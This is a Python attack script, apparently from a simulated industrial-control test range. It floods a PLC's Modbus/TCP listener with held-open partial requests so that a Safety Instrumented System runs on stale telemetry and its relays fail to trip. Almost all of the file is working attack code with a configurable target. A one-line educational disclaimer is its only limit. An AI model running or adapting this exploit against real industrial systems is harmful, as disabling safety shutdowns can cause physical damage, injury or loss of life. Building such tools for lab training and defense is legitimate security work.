#!/usr/bin/env python3
"""
ATK-16 | Safety System Override (SIS Disable)
=============================================
We are in Tier 4 (Catastrophic Incidents).

This attack mimics advanced threats (like TRITON/TRISIS) that specifically target
the Safety Instrumented System (SIS). The SIS is the ultimate fallback; if the SCADA 
system fails or is compromised, the SIS detects unsafe physical conditions 
(overvoltage, extreme temperature) and forces an emergency shutdown.

This exploit disables the target IED's ability to process safety logic. By exhausting
the TCP/Modbus connection pool of the OpenPLC container, we sever the cyber-physical
bridge. 

The SimulationEngine will no longer be able to write live telemetry (V_scaled, I_scaled)
into the IED's memory. The PLC will continue looping its safety checks on stale, perfectly
normal data, entirely blinding it to real-world chaos.

Safety
------
This module is intended solely for educational demonstration within the simulated 
TRINETRA environment. Do not use against real industrial networks.
"""

import argparse
import socket
import time
import threading

def exhaust_pool(target, port, thread_id):
    """Holds open a dead Modbus connection to consume PLC resources."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        # Send a partial Modbus request and hold it open
        s.send(b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00')
        
        while True:
            # Keep alive
            time.sleep(10)
    except Exception:
        pass

def main():
    parser = argparse.ArgumentParser(description="ATK-16: Safety System Override.")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IED IP address")
    parser.add_argument("--port", type=int, default=5020, help="Target IED Modbus Port (e.g. 5020)")
    parser.add_argument("--threads", type=int, default=50, help="Number of connections to exhaust the pool")
    parser.add_argument("--duration", type=int, default=20, help="Time to hold the safety system hostage")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  ATK-16  |  Safety System Override")
    print("=" * 60)
    print(f"[*] Target SIS      : {args.target}:{args.port}")
    print(f"[*] Attack Vectors  : {args.threads} parallel TCP exhaustion threads")
    print()

    print("[*] Phase 1: Deploying targeted connection exhaustion against SIS...")
    
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=exhaust_pool, args=(args.target, args.port, i))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.01)
        
    print(f"[+] SIS Modbus listener successfully flooded.")
    print(f"[+] Cyber-Physical telemetry pipe is severed.")
    print(f"[*] Phase 2: Monitoring blind-spot for {args.duration} seconds...")
    
    for i in range(args.duration):
        print(f"    [T+{i}s] PLC Safety Logic looping on stale telemetry (Sensors blinded).")
        time.sleep(1)
        
    print(f"\n[+] ATTACK COMPLETE.")
    print("[+] The Safety Instrumented System is disabled.")
    print("[+] If a physical surge is introduced now (e.g. via ATK-14), the relays WILL NOT TRIP.")

if __name__ == "__main__":
    main()
